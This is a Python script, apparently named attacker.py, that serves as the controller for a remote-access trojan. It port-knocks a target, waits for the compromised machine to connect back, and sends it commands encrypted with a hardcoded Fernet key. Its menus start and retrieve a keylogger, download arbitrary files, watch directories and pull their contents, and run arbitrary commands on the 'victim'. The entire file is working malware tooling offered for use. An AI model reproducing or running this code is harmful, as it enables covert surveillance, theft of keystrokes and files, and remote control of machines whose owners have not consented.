import ipaddress

from cryptography.fernet import Fernet
from scapy.all import *
from scapy.layers.inet import IP, TCP
import socket
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect(("8.8.8.8", 80))
my_ip = sock.getsockname()[0]
sock.close()
fernet = Fernet(b'JFMnqwIgPTu1BqhqtCN4uPx2d6noxOcXtAbxJB5FrIQ=')


def knock(victimIP):
    send(IP(dst=victimIP) / TCP(sport=14369, dport=19634, flags='S'))
    send(IP(dst=victimIP) / TCP(sport=13436, dport=16343, flags='S'))


def is_ipv4(string):
    try:
        ipaddress.IPv4Network(string)
        return True
    except ValueError:
        return False


def keylog_menu():
    print("type the number of your selection")
    print("1: start keylogger")
    print("2: stop keylogger")
    print("3: get keylogger file")
    print("4: back")


def keyl():
    while True:
        keylog_menu()
        selection = input()
        if selection == "1":
            return "kstart"
        elif selection == "2":
            return "kstop"
        elif selection == "3":
            return "kget"
        elif selection == "4":
            return "-1"
        else:
            print(f"err {selection} not found")


def filet():
    fileLocation = input("enter file location or type 1 to go back\n")
    if fileLocation == "1":
        return "-1"
    return "fget " + fileLocation


def watch_menu():
    print("type the number of your selection")
    print("1: watch a file/directory")
    print("2: stop watching a file/directory")
    print("3: get results of watching")
    print("4: back")


def watch():
    while True:
        watch_menu()
        selection = input()
        if selection == "1":
            filedir = input("enter the file/dir path\n")
            return "wstart " + filedir
        elif selection == "2":
            return "wstop"
        elif selection == "3":
            return "wget"
        elif selection == "4":
            return "-1"
        else:
            print(f"err {selection} not found")


def executec():
    while True:
        command = input("type a command for the victim to execute or type 1 to go back\n")
        if command == "1":
            return "-1"
        return "e " + command


def print_menu():
    print("type the number of your selection")
    print("1: keylogger")
    print("2: file transfer")
    print("3: watch file/directory")
    print("4: execute command")
    print("5: exit")


def main_menu():
    while True:
        print_menu()
        selection = input()
        if selection == "1":
            return keyl()
        elif selection == "2":
            return filet()
        elif selection == "3":
            return watch()
        elif selection == "4":
            return executec()
        elif selection == "5":
            print("exiting...")
            return "exit"
        else:
            print(f"err {selection} not found")


# decrypt and decode
def dd(msg):
    return fernet.decrypt(msg).decode()


def get_file(connection):
    file = connection.recv(4096)
    le = connection.recv(4096)
    filename = dd(trim_message(file.decode()))
    length = int(dd(trim_message(le.decode())))
    print(f'Downloading {filename}:{length}...')
    os.makedirs("files", exist_ok=True)
    f = open("files/" + os.path.split(filename)[-1], 'wb')
    while length:
        chunk = min(length, 4096)
        data = connection.recv(chunk)
        if not data: break
        f.write(data)
        length -= len(data)
    if length != 0:
        print('Invalid download.')
    else:
        print('Done.')
    f.close()


def get_directory(fileName, connection):
    while True:
        filename = dd(trim_message(connection.recv(4096)))
        if filename == "-done-":
            break
        length = int(dd(trim_message(connection.recv(4096))))
        print(f'Downloading {filename}...\n  Expecting {length:,} bytes...', end='', flush=True)
        path = os.path.join('watched', filename)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            while length:
                chunk = min(length, 4096)
                data = connection.recv(chunk)
                if not data: break
                f.write(data)
                length -= len(data)
            else:
                print('Complete')
                continue

        print('Incomplete')
        break


def trim_message(msg):
    return msg.split()[-1]


if __name__ == '__main__':
    try:
        victimIp = sys.argv[1]
    except Exception:
        print("please include the victim's IP address")
        print("example: attacker.py 192.168.0.1")
        exit()

    if (not is_ipv4(victimIp)):
        print("please use a valid IP address")
        print("example: attacker.py 192.168.0.1")

    knock(victimIp)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((my_ip, 80))
    sock.listen(1)
    print('Waiting for a client...')
    client, address = sock.accept()
    client_ip, client_port = address
    print(f'Client joined from {address}')
    with client:
        while True:
            command = main_menu()
            while command == "-1":
                command = main_menu()
            if command == "exit":
                break
            command_type = command.split()[0]
            client.sendall(fernet.encrypt(str(command).encode()))
            if command_type == "kget" or command_type == "fget":
                get_file(client)
            elif command_type == "wget":
                get_directory(" ".join(command.split()[1:]), client)
            else:
                data = client.recv(4096).decode()
                data = trim_message(data)
                print(dd(data.encode()))
